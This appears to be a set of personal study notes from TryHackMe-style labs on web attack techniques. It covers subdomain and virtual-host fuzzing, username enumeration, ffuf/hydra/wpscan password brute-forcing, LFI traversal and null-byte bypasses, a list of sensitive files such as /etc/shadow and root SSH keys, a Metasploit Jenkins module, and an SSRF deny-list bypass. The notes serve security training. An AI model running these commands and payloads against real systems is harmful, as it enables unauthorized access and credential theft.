# Subdomain Enumeration
### SSL/TLS Certificates
When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like [https://crt.sh](http://crt.sh) and [https://transparencyreport.google.com/https/certificates](https://transparencyreport.google.com/https/certificates) offer a searchable database of certificates that shows current and historical results.
Go to [crt.sh](https://crt.sh) and search for the domain name **tryhackme.com**, find the entry that was logged at **2020-12-26** and enter the domain below to answer the question.

### Jenkins
`use multi/http/jenkins_script_console`  
is a good idea

### DNS Bruteforce
`dnsrecon -t brt -d acmeitsupport.thm`

### Sublist3r
`./sublist3r.py -d acmeitsupport.thm`

### Content Discovery via Fuzzing
`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.28.112/FUZZ`

### Content Discovery via Virtual Hosts
Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 

Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the **Host** header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.
`ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.28.112/`
add -fs {size} where size is the most occurring size after previous command

## Username Enumeration
```
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.177.116/customers/signup -mr "username already exists"
```

### Bruteforcing Usernames and Passwords
```
ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.177.116/customers/login -fc 200
```

### LFI Tricks
By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:
```
include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.
and we can also use http://webapp.thm/index.php?lang=/etc/passwd/.

```
If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.
```
First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd
```

### While Checking for LFIs
Search these -
**/etc/issue**
contains a message or system identification to be printed before the login prompt.  

**/etc/profile**
controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

**/proc/version**
specifies the version of the Linux kernel  

**/etc/passwd**
has all registered user that has access to a system  

**/etc/shadow**
contains information about the system's users' passwords  

**/root/.bash_history**
contains the history commands for root user

**/var/log/dmessage**
contains global system messages, including the messages that are logged during system startup  

**/var/mail/root**
all emails for root user

**/root/.ssh/id_rsa**
Private SSH keys for a root or any known valid user on the server

**/var/log/apache2/access.log**
the accessed requests for Apache  webserver

**C:\boot.ini**
contains the boot options for computers with BIOS firmware

### SSRF Example
Let's put what we've learnt about SSRF to the test in a fictional scenario.  

We've come across two new endpoints during a content discovery exercise against the **Acme IT Support** website. The first one is **/private**, which gives us an error message explaining that the contents cannot be viewed from our IP address. The second is a new version of the customer account page at **/customers/new-account-page** with a new feature allowing customers to choose an avatar for their account.

First, create a customer account and sign in. Once you've signed in, visit [https://LAB_WEB_URL.p.thmlabs.com/customers/new-account-page](https://LAB_WEB_URL.p.thmlabs.com/customers/new-account-page) to view the new avatar selection feature. By viewing the page source of the avatar form, you'll see the avatar form field value contains the path to the image. The background-image style can confirm this in the above DIV element as per the screenshot below:

  
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/bd9ee9ac0b7592b5343cbc8dd9b57189.png)

If you choose one of the avatars and then click the **Update Avatar** button, you'll see the form change and, above it, display your currently selected avatar. Viewing the page source will show your current avatar is displayed using the data URI scheme, and the image content is base64 encoded as per the screenshot below.


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/fff0ea113602635dcf5d1e8d0b1d8bca.png)  


Now let's try making the request again but changing the avatar value to **private** in hopes that the server will access the resource and get past the IP address block. To do this, firstly, right-click on one of the radio buttons on the avatar form and select **Inspect**:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2ef87608418e47625bedad9d0361ed08.png)  

**And then edit the value of the radio button to private:**  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a1712298679cc642d792d935b14effe5.png)  

And then click the **Update Avatar** button. Unfortunately, it looks like the web application has a deny list in place and has blocked access to the /private endpoint.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a59460cc19eaf5776ee8a882e25b2d64.png)

As you can see from the error message, the path cannot start with /private but don't worry, we've still got a trick up our sleeve to bypass this rule. We can use a directory traversal trick to reach our desired endpoint. Try setting the avatar value to **x/../private**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/84b88d9c6fa6a29450520625bb42870d.png)

You'll see we have now bypassed the rule, and the user updated the avatar. This trick works because when the web server receives the request for **x/../private**, it knows that the **../** string means to move up a directory that now translates the request to just **/private**.
Viewing the page source of the avatar form, you'll see the currently set avatar now contains the contents from the **/private** directory in base64 encoding, decode this content and it will reveal a flag that you can enter below.

### wp-login.php
`wpscan --url http://internal.thm/blog --usernames admin --password /usr/share/wordlists/rockyou.txt`

`hydra -L /root/Downloads/users.txt -P /root/Downloads/fsocity.dic whoismrrobot.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwhoismrrobot.com%2Fwp-admin%2F&testcookie=1:Invalid username"`